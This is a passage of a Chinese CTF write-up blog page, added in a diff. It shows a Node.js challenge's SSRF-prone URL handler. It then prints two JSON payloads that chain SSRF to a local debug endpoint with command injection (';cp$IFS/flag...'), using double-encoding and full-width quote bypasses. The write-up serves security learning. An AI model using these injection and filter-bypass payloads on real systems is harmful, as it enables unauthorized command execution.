+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">u</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">urlObject</span><span class="o">=</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="nx">blacklist</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">urlObject</span><span class="p">.</span><span class="nx">hostname</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+		<span class="kd">var</span> <span class="nx">dest</span><span class="o">=</span><span class="nx">urlObject</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+		<span class="nx">request</span><span class="p">(</span><span class="nx">dest</span><span class="p">,(</span><span class="nx">err</span><span class="p">,</span><span class="nx">result</span><span class="p">,</span><span class="nx">body</span><span class="p">)=&gt;{</span>
+			<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
+		<span class="p">})</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+		<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">([]);</span>
+	<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">});</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>一看到黑名单内容就想到SSRF，但是这缩进就nm离谱，还以为黑名单卵用没有。。。不知道算不算出题人的恶趣味，继续往下做，log存在命令注入，但是需要本地访问才能命令执行，所以要通过POST SSRF。</p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-json" data-lang="json"><span class="err">//</span> <span class="err">二次编码</span>
+<span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http://127.1:3000/debug?url=http://%2527;cp$IFS/flag$IFS/tmp/log%00&#34;</span><span class="p">}</span>
+<span class="err">//</span> <span class="err">特殊编码</span> <span class="err">=&gt;</span> <span class="err">%EF%BC%</span><span class="mi">87</span><span class="err">解码为&#39;</span>
+<span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http://127.1:3000/debug?url=http://%EF%BC%87;cp$IFS/flag$IFS/tmp/log%00&#34;</span><span class="p">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div>
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://tyskill.github.io" class="p-author h-card" target="_blank" rel="noopener">tyskill</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/posts/buuoj_21_1/" target="_blank" rel="noopener">https://tyskill.github.io/posts/buuoj_21_1/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/posts/ycb2020/" class="related-link">羊城杯2020复现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/ciscn2021/" class="related-link">CISCN2021部分writeup及复现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/hfctf2021/" class="related-link">虎符CTF2021writeup</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/nctf2020/" class="related-link">NCTF2020记录+复现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/unctf2020/" class="related-link">UNCTF2020记录+复现</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+    
+        <div class="post-tags">
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/buuoj/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>buuoj</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/php/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>php</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>文件包含</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>代码审计</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/fat-free/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>fat-free</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>反序列化</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/javascript/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>javascript</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/ssrf/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>SSRF</a>
+                
+            
+        </div>
+    
+
+
+
+        
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/posts/htb_spectra/" rel="prev">&lt; [HTB]Spectra</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/posts/hmgctf2021/" rel="next">[BUUOJ]红明谷CTF2021复现 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            <div class="site-info">©&nbsp;2020–2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;tyskill</div><div class="powered-by">Powered by <a href="https://github.com/gohugoio/hugo" target="_blank" rel="noopener">Hugo</a> | Theme is <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a></div><div class="custom-footer">地不长无名之草，天不生无用之人</div>
+                <div class="busuanzi-site-uv-and-pv">
+                    <span id="busuanzi_container_site_uv">本站访客数&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon busuanzi-site-uv"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"/></svg>&nbsp;<span id="busuanzi_value_site_uv"></span></span>&nbsp;|&nbsp;<span id="busuanzi_container_site_pv">本站访问量&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon busuanzi-site-pv"><path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/></svg>&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                </div>
+
+            
+
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css" integrity="sha256-gPJfuwTULrEAAcI3X4bALVU/2qBU+QY/TpoD3GO+Exw=" crossorigin="anonymous">
+<script>
+    if (typeof renderMathInElement === 'undefined') {
+        var getScript = (options) => {
+            var script = document.createElement('script');
+            script.defer = true;
+            script.crossOrigin = 'anonymous';
+            Object.keys(options).forEach((key) => {
+                script[key] = options[key];
+            });
+            document.body.appendChild(script);
+        };
+        getScript({
+            src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.js',
+            integrity: 'sha256-YTW9cMncW/ZQMhY69KaUxIa2cPTxV87Uh627Gf5ODUw=',
+            onload: () => {
+                getScript({
+                    src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/mhchem.min.js',
+                    integrity: 'sha256-yzSfYeVsWJ1x+2g8CYHsB/Mn7PcSp8122k5BM4T3Vxw=',
+                    onload: () => {
+                        getScript({
+                            src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/auto-render.min.js',
+                            integrity: 'sha256-fxJzNV6hpc8tgW8tF0zVobKa71eTCRGTgxFXt1ZpJNM=',
+                            onload: () => {
+                                renderKaTex();
+                            }
+                        });
+                    }
+                });
+            }
+        });
+    } else {
+        renderKaTex();
+    }
+    function renderKaTex() {
+        renderMathInElement(
+            document.body,
+            {
+                delimiters: [
+                    {left: "$$", right: "$$", display: true},
+                    {left: "\\[", right: "\\]", display: true},
+                    {left: "$", right: "$", display: false},
+                    {left: "\\(", right: "\\)", display: false}
+                ]
+            }
+        );
+    }
+</script>
+
+
+
+
+
+
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    mediumZoom(document.querySelectorAll('div.post-body img'), {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+    
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+
+
+
+    </body>
+</html>
